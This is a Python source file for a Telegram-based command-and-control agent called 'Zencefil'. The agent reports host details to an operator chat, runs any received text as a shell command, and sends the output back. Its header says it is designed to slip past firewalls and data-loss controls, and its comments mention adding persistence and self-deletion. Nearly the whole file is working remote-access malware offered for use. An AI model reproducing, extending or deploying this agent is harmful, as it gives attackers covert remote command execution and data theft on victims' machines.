#!/usr/bin/env python3
# ==============================================================================
# 🍯 Zencefil Telegram C2 Agent
# Description: A decentralized Command and Control agent that uses the Telegram API
#              for communication. Bypasses traditional NGFW/DLP by blending in 
#              with legitimate HTTPS Telegram traffic.
# ==============================================================================

import os
import time
import subprocess
import requests
import json
import socket
import platform

# --- CONFIGURATION ---
# Replace with your Telegram Bot Token
BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE"
# Replace with your Telegram Chat ID (to ensure only YOU can control the bot)
CHAT_ID = "YOUR_CHAT_ID_HERE"
# ---------------------

TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

def send_message(text):
    """Sends a message back to the Telegram chat."""
    url = f"{TELEGRAM_API}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception:
        pass

def get_updates(offset):
    """Polls the Telegram API for new messages/commands."""
    url = f"{TELEGRAM_API}/getUpdates"
    params = {"offset": offset, "timeout": 30}
    try:
        response = requests.get(url, params=params, timeout=35)
        if response.status_code == 200:
            return response.json()
    except Exception:
        pass
    return None

def execute_command(cmd):
    """Executes a system command and returns the output."""
    try:
        # Avoid hanging on interactive commands
        if cmd.startswith("cd "):
            os.chdir(cmd.split(" ")[1])
            return f"Changed directory to {os.getcwd()}"
            
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
        output = result.stdout if result.stdout else result.stderr
        return output if output else "Command executed silently."
    except Exception as e:
        return f"Error executing command: {str(e)}"

def main():
    offset = 0
    hostname = socket.gethostname()
    os_info = platform.system()
    try:
        user = os.getlogin()
    except:
        user = "Unknown"
    
    welcome_msg = f"🍯 **Zencefil Agent Online**\nHost: `{hostname}`\nOS: `{os_info}`\nUser: `{user}`\nAwaiting commands..."
    send_message(welcome_msg)

    while True:
        updates = get_updates(offset)
        
        if updates and "result" in updates:
            for item in updates["result"]:
                offset = item["update_id"] + 1
                
                if "message" in item and "text" in item["message"]:
                    msg_chat_id = str(item["message"]["chat"]["id"])
                    
                    # Security Check: Only accept commands from the authorized CHAT_ID
                    if msg_chat_id == CHAT_ID:
                        command = item["message"]["text"]
                        
                        if command.lower() == "/ping":
                            send_message("Pong! Agent is alive.")
                        elif command.lower() == "/selfdestruct":
                            send_message("Initiating self-destruct sequence. Goodbye.")
                            # Add self-deletion logic here in a real scenario
                            exit(0)
                        else:
                            # Execute the command
                            send_message(f"⚙️ Executing: `{command}`")
                            output = execute_command(command)
                            
                            # Telegram max message length is 4096. Chunk it if necessary.
                            if len(output) > 4000:
                                output = output[:4000] + "\n...[TRUNCATED]"
                                
                            send_message(f"```\n{output}\n```")

        # Sleep to prevent spamming the API too heavily
        time.sleep(2)

if __name__ == "__main__":
    # In a real scenario, daemonize the process and establish persistence here
    main()